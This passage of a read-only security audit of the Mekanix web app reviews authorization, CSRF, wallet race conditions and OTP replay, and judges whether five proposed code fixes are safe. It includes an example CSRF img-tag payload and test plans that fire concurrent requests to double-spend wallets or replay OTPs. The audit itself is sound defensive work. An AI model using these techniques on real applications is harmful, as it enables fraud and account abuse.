**Attack scenario (future risk):** If a "read-only admin" or "moderator" role is ever added (per ARCHITECTURE.md §5 which mentions role tiers), they would automatically have full admin access because `requireRole(session, "ADMIN")` only checks for the literal string "ADMIN", not for the role hierarchy.

**Impact:** Structural privilege-escalation risk if lower-privileged admin roles are added in the future.

**Suggested fix:** Define a strict hierarchy and add `requireSuperAdmin(session)` / `requireAdminRole(session, role)` helpers. Validate the role on token creation against an enum.

**Effort to fix:** M (2–4 hours)

---

### SEC-20 (LOW): No CSRF protection for cookie-based auth

**Location:** `src/app/api/auth/otp/verify/route.ts:139-145`
**Category:** Auth / CSRF

**Description:** The user JWT is set as an HttpOnly cookie with `sameSite: "lax"`. The `lax` policy allows the cookie to be sent on top-level navigations (GET requests) from external sites. State-changing operations via GET would be vulnerable to CSRF — e.g., a hypothetical `GET /api/jobs/[id]/status?action=complete` would be triggerable cross-origin.

The codebase currently does NOT have any state-changing GET endpoints (all mutations use POST/PATCH/DELETE), so the risk is latent. But there's no enforcement — a future developer could add a state-changing GET route without realizing the CSRF implication.

**Attack scenario (future risk):** If a state-changing GET endpoint is added (e.g., for one-click actions like `GET /api/notifications/[id]/mark-read`), an attacker page can embed `<img src="https://mekanix.app/api/notifications/abc/mark-read">` and the browser sends the user's cookie.

**Impact:** Future CSRF risk if state-changing GET endpoints are introduced.

**Suggested fix:** Either (a) set `sameSite: "strict"` for state-changing cookies (but this breaks OAuth redirect flows), OR (b) document and enforce that all mutations MUST use POST/PATCH/PUT/DELETE methods, OR (c) add a CSRF token mechanism for cookie-based mutations.

**Effort to fix:** S (10 minutes — documentation + lint rule) to M (4 hours — CSRF token mechanism)

---

## Positive Findings (security strengths to preserve)

### Authentication & Session
1. **JWT secret inside function body (user auth)** — `src/lib/auth.ts:33-43` reads `process.env.JWT_SECRET` inside `getSecret()` (not module-level). Survives secret rotation in Workers.
2. **Fail-closed session verification** — `verifySession()` returns `null` in production if DB is unreachable (auth.ts:170-177). Prevents revoked sessions from passing during DB outages.
3. **Fail-closed session creation** — `createSession()` throws in production if DB write fails (auth.ts:121-129). Prevents untracked sessions from being issued.
4. **Fail-closed session revocation** — `revokeSession()` / `revokeAllUserSessions()` no longer swallow errors (auth.ts:193-202, 212-220).
5. **Hashed OTP storage** — OTP codes are SHA-256 hashed before storage (otp-crypto.ts:12-14). DB read alone cannot reveal usable codes.
6. **CSPRNG for OTP codes** — `crypto.randomInt(100000, 1000000)` (otp-crypto.ts:7-9), not `Math.random()`.
7. **OTP rate limiting** — Per-phone (5/10min) AND per-IP (20/hour) rate limits on `/api/auth/otp/send` (otp/send/route.ts:41-58). Per-IP (5/min) on `/api/auth/otp/verify` (otp/verify/route.ts:20-30).
8. **HttpOnly + secure + sameSite cookie** — User JWT cookie: `httpOnly: true, secure: production-only, sameSite: "lax"` (otp/verify/route.ts:139-145).

### Authorization (BOLA)
9. **Comprehensive BOLA helpers** — 7 user-side helpers (`requireVehicleOwner`, `requireJobParticipant`, `requireNotificationOwner`, `requireWalletOwner`, `requireTicketOwner`, `requirePolicyOwner`, `requireAuth`) + 3 care-specific (`requireBookingParticipant`, `requireAssignedTechnician`, `requireBookingOwner`). Used consistently in most write routes.
10. **Server-authoritative userId** — Across all routes reviewed, `userId` is derived from `session.userId`, never from request body.
11. **Server-authoritative amounts** — Payment amounts come from `invoice.total` (payments/route.ts:150) or `technician.hourlyRate` (invoices/route.ts:86), not from client body.
12. **Mass-assignment protection** — `sanitizeInput()` + `ALLOWED_FIELDS` whitelists + `FORBIDDEN_FIELDS` denylist. Applied consistently across POST/PATCH routes (auth.ts:376-405).
13. **Defense-in-depth on technician self-edit** — `BLOCKED_FOR_SELF` strips `verified`, `rating`, `reviewCount`, `completedJobs`, `level`, `status` even for admins editing via `/api/technicians/[id]` (technicians/[id]/route.ts:81-91). Admins must use `/api/admin/[resource]/[id]`.

### Concurrency (where correct)
14. **Optimistic concurrency on job status** — `db.job.updateMany({ where: { id, status: existing.status } })` + count check (jobs/[id]/status/route.ts:152-162).
15. **Optimistic concurrency on care booking status** — Same pattern (care/technician/missions/[id]/route.ts:80-87).
16. **Optimistic concurrency on prepay** — `db.job.updateMany({ where: { id, prepayPaid: false } })` + count check (prepay/route.ts:60-74).
17. **Optimistic concurrency on invoice PAID** — `db.invoice.updateMany({ where: { id, status: { not: "PAID" } } })` (payments/route.ts:111-114, 159-162).
18. **Idempotent session revocation** — `updateMany({ where: { tokenHash, revokedAt: null } })` makes logout idempotent (auth.ts:193-202).

### Production Hardening
19. **Production guards on simulator routes** — `/api/auth/demo`, `/api/prepay`, `/api/gateway/initiate`, `/api/gateway/verify` all return 404 in production (auth/demo/route.ts:24-26, prepay/route.ts:21-23, gateway/initiate/route.ts:21-23, gateway/verify/route.ts:22-24).
20. **next.config.ts defense-in-depth** — Production rewrites `/api/auth/demo` → `/404` (next.config.ts:11-20) so the route handler never runs.
21. **No filesystem access on Workers** — admin-panel/onboarding routes store image uploads as D1 data URLs (no `fs`/`path` imports). `/api/seed` route (which used `child_process.exec`) was REMOVED from the feature branch.

### Input Validation
22. **Zod schema validation** — All request bodies validated via `validateBody(req, schema)` (api-helpers.ts:48-57). Persian error messages. Schemas defined per-domain in `src/lib/schemas/`.
23. **No raw SQL queries with user input** — Only `$queryRaw\`SELECT 1\`` for health checks (health/route.ts:18, ready/route.ts:13). No string interpolation in raw queries.
24. **Input length caps** — Most string fields are `.slice(0, N)` capped (e.g., vehicles, technician notes, ticket messages, review comments) to prevent storage abuse.
25. **Type validation on numeric inputs** — `typeof body.amount === "number"`, `typeof body.quantity === "number"`, etc. before use.

### State Machine
26. **Job state machine** — Per-role allowed transitions enforced (jobs/[id]/status/route.ts:44-75). Customers can only CANCEL pre-service; technicians can advance through their workflow.
27. **Care booking state machine** — Per-role transitions with special-case validation (care-auth.ts:193-235). Customer APPROVED only valid from WAITING_CUSTOMER_APPROVAL; CANCELLED only valid pre-IN_SERVICE.
28. **Approval state machine** — `PROPOSED → CUSTOMER_APPROVED | CUSTOMER_REJECTED` (terminal) enforced (care-auth.ts:260-272).

### Audit Logging (where present)
29. **Admin onboarding audit** — POST/PATCH/DELETE on `/api/admin-panel/onboarding` call `writeAuditLog` with before/after snapshots and IP/UA (admin-panel/onboarding/[id]/route.ts:64,77; onboarding/route.ts:46).

---

## Coverage Matrix

| Area | Files Reviewed | Findings |
|------|----------------|----------|
| Auth & Session | auth.ts, admin-auth.ts, care-auth.ts, api-helpers.ts, otp-crypto.ts, rate-limit.ts, permissions.ts, auth/otp/send, auth/otp/verify, auth/session, auth/demo, auth/logout, admin-panel/auth/login, admin-panel/auth/me | SEC-5, SEC-10, SEC-13, SEC-14, SEC-15, SEC-16, SEC-17, SEC-18, SEC-19, SEC-20 (10 findings) |
| BOLA/IDOR | vehicles/[id], technicians/[id], jobs/[id]/*, service-requests/[id]/assign, invoices/[id], admin/[resource]/*, care/bookings/[id]/*, care/technician/missions/[id], care/vehicles/[id]/*, notifications/[id], dashboard | SEC-11, SEC-12 (2 findings) |
| Payments/Wallets | payments, prepay, gateway/initiate, gateway/verify, wallets, wallets/withdraw, invoices, invoices/[id] | SEC-2, SEC-3, SEC-7, SEC-8, SEC-9 (5 findings) |
| Admin & Audit | admin/[resource], admin/[resource]/[id], admin-panel/onboarding/*, admin-panel/auth/login, mechanic-applications/[id]/*, care/admin/packages, care/admin/rules | SEC-4, SEC-5, SEC-13, SEC-14, SEC-15, SEC-18, SEC-19 (7 findings) |
| Input Validation | schemas/auth.ts, schemas/index.ts, all routes (Zod validation), $queryRaw scan | (no new findings — input validation is solid) |
| Other (Config/Secrets) | next.config.ts, wrangler.toml, db-access.ts, db-worker.ts, sms-provider.ts, sync-engine.ts | SEC-1 (branch protection), SEC-16 (rate limit bypass), SEC-17 (JWT secret module-level) (3 findings) |
| **Total** | **84 files** | **20 findings (2 CRITICAL, 4 HIGH, 9 MEDIUM, 5 LOW)** |

---

## Recommendations for Phase 4 (Runtime Testing)

The following runtime tests should be written to verify the highest-priority findings. Tests should be added under `tests/security/` (already exists on feature branch with `bola-idor.test.ts`).

### P0 — Before merge (verify CRITICAL fixes)

1. **`tests/security/vip-subscribe-bypass.test.ts`** — Verify SEC-7 fix:
   - Test: POST `/api/vip/subscribe` with valid `planId` and no `paymentId` → expect 400 (not 200).
   - Test: POST `/api/vip/subscribe` with `paymentId` of a non-existent payment → expect 400.
   - Test: POST `/api/vip/subscribe` with `paymentId` of a payment owned by ANOTHER user → expect 403.
   - Test: POST `/api/vip/subscribe` with `paymentId` of a `FAILED` payment → expect 400.
   - Test: POST `/api/vip/subscribe` with `paymentId` of a `SUCCEEDED` payment for less than `plan.price` → expect 400.

2. **`tests/security/wallet-concurrent-release.test.ts`** — Verify SEC-8 fix:
   - Test: Seed a wallet with `balance=0`, `pendingBalance=50`, and a PENDING transaction with `holdUntil < now`.
   - Test: Fire `Promise.all([fetch('/api/wallets'), fetch('/api/wallets')])` (technician auth).
   - Assert: Final `wallet.balance === 50` (not 100). Final `wallet.pendingBalance === 0`.

3. **`tests/security/wallet-withdraw-race.test.ts`** — Verify SEC-9 fix:
   - Test: Seed a wallet with `balance=1000`.
   - Test: Fire `Promise.all([fetch('/api/wallets/withdraw', { body: { amount: 500 } }), fetch('/api/wallets/withdraw', { body: { amount: 500 } })])`.
   - Assert: One request returns 200, the other returns 409 (or both return 200 but final `wallet.balance === 0` and only ONE `WithdrawalRequest` created).
   - Test: Verify no orphaned `WithdrawalRequest` rows.

### P1 — High priority

4. **`tests/security/otp-replay.test.ts`** — Verify SEC-10 fix:
   - Test: Send OTP, capture code.
   - Test: Fire `Promise.all([fetch('/api/auth/otp/verify', { body: { phone, code } }), fetch('/api/auth/otp/verify', { body: { phone, code } })])`.
   - Assert: Exactly ONE request returns 200 with a session; the other returns 400 ("Code already used").
   - Assert: Only ONE `Session` DB row created for the user.

5. **`tests/security/care-timeline-bola.test.ts`** — Verify SEC-11 fix:
   - Test: Customer A has a booking. Customer B is a different user.
   - Test: Customer B calls `GET /api/care/bookings/[A's booking id]/timeline` → expect 403 (currently returns 200).
   - Test: Customer A calls same → expect 200.

6. **`tests/security/dashboard-pii.test.ts`** — Verify SEC-12 fix:
   - Test: Customer calls `GET /api/dashboard` → expect 403 (or scoped response with no `techPerformance` / `recentActivity` containing other users' names).
   - Test: Admin calls same → expect 200 with full dashboard.

### P2 — Medium priority

7. **`tests/security/admin-login-enumeration.test.ts`** — Verify SEC-13 fix:
   - Test: POST login with non-existent username → expect 401 with generic error.
   - Test: POST login with valid username + wrong password → expect 401 with SAME generic error.
   - Test: Response bodies are byte-identical (no timing or message difference).

8. **`tests/security/admin-token-revocation.test.ts`** — Verify SEC-15 fix (post-merge):
   - Test: Admin logs in, captures token.
   - Test: Admin "logout" (new endpoint) → token marked revoked.
   - Test: Subsequent request with the revoked token → expect 401.
   - Test: Admin password changes → all existing admin tokens for that admin become invalid.

9. **`tests/security/rate-limit-spoofing.test.ts`** — Verify SEC-16 fix:
   - Test (dev): Send 100 requests with rotating `X-Forwarded-For` headers → expect rate limit kicks in based on real client IP, not spoofed.
   - Test (prod): Send requests without `CF-Connecting-IP` and `X-Forwarded-For` → expect rate limit bucket is per-UA-hash, not "anonymous".

### P3 — Low priority / hardening

10. **`tests/security/csrf-protection.test.ts`** — Verify SEC-20:
    - Test: If any state-changing GET endpoint is added, document that it must be migrated to POST/PATCH.
    - Test: Add a lint rule that flags any `export async function GET` in `src/app/api/` that calls a `db.*.update*` or `db.*.create` or `db.*.delete`.

11. **`tests/security/audit-log-coverage.test.ts`** — Verify SEC-4 fix:
    - Test: Every admin mutation route (PATCH/POST/DELETE under `/api/admin/*` and `/api/admin-panel/*`) calls `writeAuditLog`.
    - Implement as a static analysis test: grep all admin routes for `writeAuditLog` import + call.

---

## Constraints Status

| Constraint | Status |
|-----------|--------|
| main untouched | ✅ e4c2faf (no commits, no merges, no pushes) |
| PR #3 not merged | ✅ still open |
| No remote D1 migration | ✅ none executed |
| No deploy | ✅ none performed |
| All work on feature branch | ✅ audited feature/cloudflare-d1-validation @ 7694b77 (via temporary worktree at /tmp/mekanix-feature) |
| No source files modified | ✅ audit document + worklog entry only |
| No new migrations | ✅ none |

---

## Methodology Notes

This audit was conducted by:
1. Reading the prior audit (`docs/PHASE3_SECURITY_AUDIT.md` on feature branch, commit `fdb908c`) to understand baseline.
2. Creating a temporary git worktree of `feature/cloudflare-d1-validation` at `/tmp/mekanix-feature` (no source files in `/home/z/my-project` were modified).
3. Systematically reading all 69 API route files + 15 lib/config files.
4. For each finding, verifying with concrete code references (file:line).
5. Cross-referencing: confirming `writeAuditLog` is only called in 3 routes via `grep`; confirming `withIdempotency` is unused via `grep`; confirming the only `$queryRaw` usages are safe (static `SELECT 1`).
6. NOT running any code, NOT executing any tests, NOT making any network calls — pure static review.

The audit is independent — findings SEC-7 through SEC-20 were not present in the prior audit and represent new issues discovered during this review.

---

## Fix Safety Review (Read-Only)

**Date:** 2026-10-14
**Reviewer:** fix-safety-review agent (Task ID: 3)
**Branch reviewed:** `feature/cloudflare-d1-validation @ 7694b77` (source files read via `git show feature/cloudflare-d1-validation:<path>` — no branches switched, no working tree modified)
**Constraint:** READ-ONLY. No source files modified, no migrations, no deploys, no remote pushes, main untouched, PR #3 not merged.
**Scope:** Static review of 5 proposed fixes (SEC-7 through SEC-11). For each, verify the fix does NOT introduce a NEW vulnerability, race condition, state-machine regression, or collateral breakage.

### Fix Safety: SEC-7

**Proposed fix:** Add a production guard returning 404 to `/api/vip/subscribe/route.ts` (matching the existing pattern on `/api/prepay`, `/api/gateway/initiate`, `/api/gateway/verify`, `/api/auth/demo`).

**Files read:**
- `src/app/api/vip/subscribe/route.ts:1-76` (feature branch)
- `src/app/api/prepay/route.ts:34-38` (feature branch — guard pattern)
- `src/app/api/gateway/initiate/route.ts:19-23` (feature branch — guard pattern)
- `src/app/api/gateway/verify/route.ts:20-24` (feature branch — guard pattern)
- `src/app/api/auth/demo/route.ts:20-26` (feature branch — original guard)
- `src/components/mek/customer/vip.tsx:62-82` (frontend caller of `/api/vip/subscribe`)

**Verified safe?** YES

**Concerns found (if any):**
1. `src/components/mek/customer/vip.tsx:73-82` — the frontend `CustomerVip.onPaid()` calls `/api/vip/subscribe` via `authFetch` in production. Adding the 404 guard will break the customer-facing VIP subscription flow in production (returns 404, JSON parse fails, user sees error toast). **However**, this breakage is pre-existing: the same frontend calls `/api/gateway/initiate` and `/api/gateway/verify` (also disabled in production via 404) earlier in the same flow — so the customer already cannot complete a real payment via the simulator. The SEC-7 fix simply extends the "simulator-only" pattern to `/api/vip/subscribe`, failing-closed instead of silently issuing free VIP subscriptions. The proper long-term fix is the audit's option (b): wire up a real payment gateway integration.

**Recommended adjustment to the proposed fix (if needed):**
Use the EXACT pattern from `/api/prepay/route.ts:34-38` and `/api/gateway/initiate/route.ts:19-23` — same env var, same response code, same body:
```ts
export async function POST(req: Request) {
  // Hard block in production — simulator must not issue real VIP subscriptions
  if (process.env.NODE_ENV === "production") {
    return new NextResponse(null, { status: 404 });
  }

  // Require authentication
  const session = await requireAuth(req);
  if (session instanceof NextResponse) return session;
  // ...rest of route unchanged
}
```
Key details:
- **Env var:** `process.env.NODE_ENV === "production"` (NOT a custom env var)
- **Response code:** `404`
- **Response body:** `new NextResponse(null, { status: 404 })` — bare 404, NO JSON body (matches all 4 reference routes — important for fingerprinting resistance)
- **Placement:** at the very TOP of the POST handler, BEFORE `requireAuth` (so production requests short-circuit without any DB hit)

**Confidence:** HIGH

---

### Fix Safety: SEC-8

**Proposed fix:** Replace the unconditional `walletTransaction.update` in `/api/wallets/route.ts` GET auto-release loop with a conditional `walletTransaction.updateMany({ where: { id, status: "PENDING" } })`, and only apply the wallet delta if `releaseResult.count === 1`.

**Files read:**
- `src/app/api/wallets/route.ts:1-78` (feature branch, esp. lines 50-67 — the auto-release loop)
- `prisma/schema.prisma` — `WalletTransaction` model (has `releasedAt DateTime?` field)
- `src/components/mek/technician/earnings.tsx:42-48, 78` (frontend poller; WalletTxn type with `releasedAt`)
- `src/components/mek/technician/earnings.tsx:170-220` (uses `holdUntil` for countdown, NOT `releasedAt`)

**Verified safe?** YES

**Concerns found (if any):**
1. `src/components/mek/technician/earnings.tsx:81-82` — the frontend polls `GET /api/wallets` every 30 seconds (`setInterval(..., 30000)`). With the proposed fix, each poll will try `updateMany` on each releasable transaction. The first poll after a transaction becomes releasable will get `count=1` and apply the delta; all subsequent polls will get `count=0` and skip the delta. The wallet balance stays correct because the `fresh` re-read at `wallets/route.ts:69-75` returns the post-release balance. **No regression.**
2. `releasedAt` field is only referenced in the WalletTxn TYPE declaration (`earnings.tsx:44`) — it is NOT displayed, NOT used for any conditional logic, and NOT used to compute "released" status (the frontend uses `holdUntil` for the countdown and considers a txn "released" when `holdUntil <= now`). Setting `releasedAt = now` (single `Date` instance shared across all releases in the same GET, same as the original code) does NOT break any consumer.
3. No webhook or downstream service relies on the auto-release ALWAYS happening on GET — `git grep` confirms the only writer is `wallets/route.ts` itself and the only reader is the type declaration.

**Recommended adjustment to the proposed fix (if needed):**
None. The proposed fix is correct as-is. The atomic SQL `UPDATE WalletTransaction SET status='AVAILABLE', releasedAt=? WHERE id=? AND status='PENDING'` guarantees only one concurrent request gets `count=1`; the other gets `count=0` and correctly skips the wallet delta. The wallet/transaction state remains consistent.

**Confidence:** HIGH

---

### Fix Safety: SEC-9

**Proposed fix:** Change `data: { balance: balanceAfter }` to `data: { balance: { decrement: amount } }` in `/api/wallets/withdraw/route.ts` (line 89).

**Files read:**
- `src/app/api/wallets/withdraw/route.ts:1-127` (feature branch, esp. lines 55-126)
- `prisma/schema.prisma` — `Wallet` model and `WithdrawalRequest` model
- `src/app/api/wallets/withdraw/[id]/route.ts` — DELETED on feature branch (no cancel/delete endpoint exists)

**Verified safe?** NEEDS-ADJUSTMENT

**Concerns found (if any):**
1. `src/app/api/wallets/withdraw/route.ts:102-103` — the `walletLedger.create` writes `balanceBefore` and `balanceAfter` (both computed at line 67-68 from the pre-decrement `lockedWallet.balance` read). After the proposed fix, with two concurrent withdrawals of 500 from a 1000-balance wallet, BOTH ledger entries would record `balanceAfter=500`, but the actual final balance is 0. **Audit-trail data integrity issue.**
2. `src/app/api/wallets/withdraw/route.ts:122` — the response body `newBalance: balanceAfter` is also stale in the concurrent case. Frontend (`earnings.tsx:130-140`) uses this to display "your new balance" to the technician. With the fix, the displayed balance would be wrong (500 instead of 0) until the next 30-second poll refreshes it. UX issue, not a security issue.
3. `src/app/api/wallets/withdraw/route.ts:91-94` — if `deductResult.count === 0` (concurrent request won the race), the route throws an Error → caught at line 123 → returns 400 to the client. **HOWEVER**, the `withdrawalRequest` was already created at line 71-82 BEFORE the `updateMany`. This leaves an orphaned `WithdrawalRequest` row (status=REQUESTED) with no corresponding wallet deduction. If the admin approves this orphan, the technician receives a payout with no wallet debit. **PRE-EXISTING issue (the original buggy code has the same problem); the proposed fix does NOT introduce it, but also does NOT fix it.**

**Recommended adjustment to the proposed fix (if needed):**
After the atomic decrement succeeds, RE-READ `wallet.balance` and use that ACTUAL value for the ledger and response:
```ts
const deductResult = await db.wallet.updateMany({
  where: { id: wallet.id, balance: { gte: amount } },
  data: { balance: { decrement: amount } },
});
if (deductResult.count === 0) {
  throw new Error("موجودی توسط درخواست هم‌زمان تغییر کرد — دوباره تلاش کنید");
}

// Re-read to get the actual post-decrement balance (concurrent withdrawals
// may have decremented too — the pre-computed `balanceAfter` is stale).
const updatedWallet = await db.wallet.findUnique({ where: { id: wallet.id } });
const actualBalanceAfter = updatedWallet ? Number(updatedWallet.balance) : balanceAfter;

await db.walletLedger.create({
  data: {
    walletId: wallet.id,
    type: "WITHDRAWAL",
    amount: -amount,
    balanceBefore,
    balanceAfter: actualBalanceAfter,   // ← use ACTUAL, not pre-computed
    referenceType: "Withdrawal",
    referenceId: withdrawal.id,
    description: `Withdrawal request ${withdrawal.code}`,
  },
});

// ...notification unchanged...

return NextResponse.json({ withdrawal, newBalance: actualBalanceAfter });  // ← ACTUAL
```
The orphaned-`WithdrawalRequest` issue (concern #3) is OUT OF SCOPE for SEC-9 — it is a pre-existing race that should be tracked as a separate finding (e.g., move the `withdrawalRequest.create` to AFTER the successful `updateMany`, or add a cleanup `withdrawalRequest.delete` in the catch block). Flagging it here so it isn't lost.

**Confidence:** HIGH

---

### Fix Safety: SEC-10

**Proposed fix:** Replace `otpCode.findFirst` + `otpCode.update` (lines 53-63 of `/api/auth/otp/verify/route.ts`) with `otpCode.updateMany({ where: { phone, code: codeHash, consumed: false, expiresAt: { gt: now } }, data: { consumed: true } })`, return 400 if `count === 0`.

**Files read:**
- `src/app/api/auth/otp/verify/route.ts:1-157` (feature branch, esp. lines 50-93)
- `prisma/schema.prisma` — `OtpCode` model (has optional `userId` field, never read by verify route)
- `src/lib/auth.ts:93-132` — `createSession` (uses `user.id`, not `otp.userId`)

**Verified safe?** YES

**Concerns found (if any):**
1. The audit's question (paraphrased): "After the atomic update, how should the fix obtain the OTP row's `userId` to create the session?" — **Answer: it doesn't need to.** The existing verify route at `otp/verify/route.ts:68-93` looks up the user by `phone` (lines 68-72 do `db.user.findUnique({ where: { phone } })`), NOT by `otp.userId`. If no user matches the phone, the route CREATES one (lines 95-110). The OTP row's `userId` field is never read. So `updateMany` (which doesn't return the row) is fine — the session creation flow is independent.
2. Minor UX regression: the original code returns DISTINCT error messages for distinct cases — `"Invalid code"` (no row matches), `"Code expired"` (row matches but expired), and the implicit success path. The proposed fix conflates ALL `count===0` cases (invalid code, expired, already-consumed) into a single `"Code already used"` message. **This is actually MORE SECURE** — less information disclosure to attackers brute-forcing codes (they can't distinguish "wrong code" from "expired code" from "already used code"). Not a vulnerability, just a UX consideration.
3. `updateMany` consumes ALL matching rows, not just one. In the rare case where two OTPs with the same phone+codeHash exist (collision in 6-digit CSPRNG, ~1 in 1M), `updateMany` consumes both, preventing replay of either. The original `findFirst + update by id` only consumed one, leaving the other replayable. **The proposed fix is MORE SECURE on this axis too.**

**Recommended adjustment to the proposed fix (if needed):**
None required for security. If preserving the distinct error messages is desired for UX, the fix can KEEP the `findFirst` for error differentiation and ADD the atomic `updateMany` afterward as the race-safety gate:
```ts
const otp = await db.otpCode.findFirst({
  where: { phone, code: codeHash, consumed: false },
  orderBy: { createdAt: "desc" },
});
if (!otp) return NextResponse.json({ error: "Invalid code" }, { status: 400 });
if (otp.expiresAt.getTime() < Date.now()) {
  return NextResponse.json({ error: "Code expired" }, { status: 400 });
}

// Atomic consume — closes the race window. If a concurrent verify already
// consumed this code, count===0 and we return 400 (one-time property preserved).
const consumed = await db.otpCode.updateMany({
  where: { id: otp.id, consumed: false, expiresAt: { gt: new Date() } },
  data: { consumed: true },
});
if (consumed.count === 0) {
  return NextResponse.json({ error: "Code already used (concurrent request)" }, { status: 400 });
}
```
This is OPTIONAL — the audit's proposed fix (replacing findFirst entirely with updateMany) is also safe.

**Confidence:** HIGH

---

### Fix Safety: SEC-11

**Proposed fix:** Add `requireBookingParticipant(session, id)` to `/api/care/bookings/[id]/timeline/route.ts` after `requireAuth`.

**Files read:**
- `src/app/api/care/bookings/[id]/timeline/route.ts:1-12` (feature branch — the vulnerable route)
- `src/app/api/care/bookings/[id]/route.ts:1-45` (feature branch — sibling that HAS the check, the canonical pattern to copy)
- `src/lib/care-auth.ts:1-54` (where `requireBookingParticipant` is defined and exported)
- `src/lib/auth.ts:240-371` (verified `requireBookingParticipant` is NOT here — common implementer mistake would be to import from `@/lib/auth`)
- `src/app/api/care/technician/missions/[id]/route.ts:1-110` (the analogous technician-side route — HAS the check)
- File-tree search for `/api/care/technician/missions/[id]/timeline` — **does NOT exist** on feature branch

**Verified safe?** YES

**Concerns found (if any):**
1. **Import path is critical.** `requireBookingParticipant` is exported from `src/lib/care-auth.ts:18`, NOT from `src/lib/auth.ts`. The audit's suggested fix code does not show the import statement. An implementer who copy-pastes from the audit without checking the import path may write `import { requireBookingParticipant } from "@/lib/auth"` — which would be `undefined` at runtime, causing a `TypeError: requireBookingParticipant is not a function` 500 error on EVERY request. The sibling `src/app/api/care/bookings/[id]/route.ts:6` shows the CORRECT import: `import { requireBookingParticipant } from "@/lib/care-auth";`.
2. **Signature:** `requireBookingParticipant(session: Session, bookingId: string): Promise<NextResponse | null>` — TWO args `(session, bookingId)`. There is NO third `requiredRole` arg (the audit's question asked about this). Returns `Promise<NextResponse | null>` (does NOT throw — all errors are returned as NextResponse). The proposed fix's `if (authErr) return authErr;` pattern is correct.
3. **Placement:** the helper MUST be called AFTER `const { id } = await ctx.params;` extracts the bookingId from the route context. The current timeline route does this at line 9; the helper call must be inserted between line 9 and line 10 (before the `findMany` call).
4. **No collateral damage:** `git grep` for frontend callers of `/api/care/bookings/[id]/timeline` returns ZERO matches in `src/components/` — the frontend uses `/api/care/bookings/[id]` (which already includes `timeline` in its response). No frontend flow depends on the timeline sub-route.
5. **State machine:** the fix does NOT touch any state transition. It only adds an authorization check before the read. No valid user (booking owner or assigned technician) loses the ability to view timelines they're authorized to see; only unauthorized users lose access.
6. **No analogous `/api/care/technician/missions/[id]/timeline` route exists** on the feature branch — the audit's question about whether to flag it is moot. The only technician-side mission route is `/api/care/technician/missions/[id]/route.ts` which ALREADY has `requireBookingParticipant` (line 22).

**Recommended adjustment to the proposed fix (if needed):**
Match the sibling route's pattern exactly (variable name + import path):
```ts
import { NextResponse } from "next/server";
import { getDbForLib } from "@/lib/db-access";
import { requireAuth } from "@/lib/api-helpers";
import { requireBookingParticipant } from "@/lib/care-auth";   // ← from care-auth, NOT auth

export async function GET(req: Request, ctx: { params: Promise<{ id: string }> }) {
  const db = await getDbForLib();
  const session = await requireAuth(req);
  if (session instanceof NextResponse) return session;
  const { id } = await ctx.params;

  // BOLA: only ADMIN / booking owner / assigned technician may read the timeline.
  const authError = await requireBookingParticipant(session, id);
  if (authError) return authError;

  const events = await db.serviceTimelineEvent.findMany({
    where: { bookingId: id },
    orderBy: { timestamp: "asc" },
  });
  return NextResponse.json(events);
}
```
The audit's variable name `authErr` works too — using `authError` matches the sibling for grep-ability.

**Confidence:** HIGH

---

### Overall Safety Verdict
- 4 of 5 fixes are safe to apply as-proposed (SEC-7, SEC-8, SEC-10, SEC-11)
- 1 of 5 fixes need adjustment before applying (SEC-9 — re-read `wallet.balance` after the atomic decrement to fix stale `balanceAfter` in ledger + response)
- 0 of 5 fixes have unresolved concerns requiring human review

**Note on SEC-9:** the proposed fix as written closes the targeted race condition (the security vulnerability) but introduces a data-integrity regression in the walletLedger audit trail and a UX regression in the response body. The recommended adjustment is small (one re-read + two variable swaps) and should be applied BEFORE merging the SEC-9 fix. A pre-existing orphaned-`WithdrawalRequest` issue is OUT OF SCOPE for SEC-9 and should be tracked as a separate finding.

**Note on environment:** The `/home/z/my-project` working directory was on `main` (commit 3324794) at review time, NOT `feature/cloudflare-d1-validation` as the task description stated. To preserve the read-only constraint (no branch switches, no working-tree mutations), all source-file reads for this review were done via `git show feature/cloudflare-d1-validation:<path>` and the extracted files were placed under `/tmp/mek-review/`. No files under `/home/z/my-project/src/` were modified.
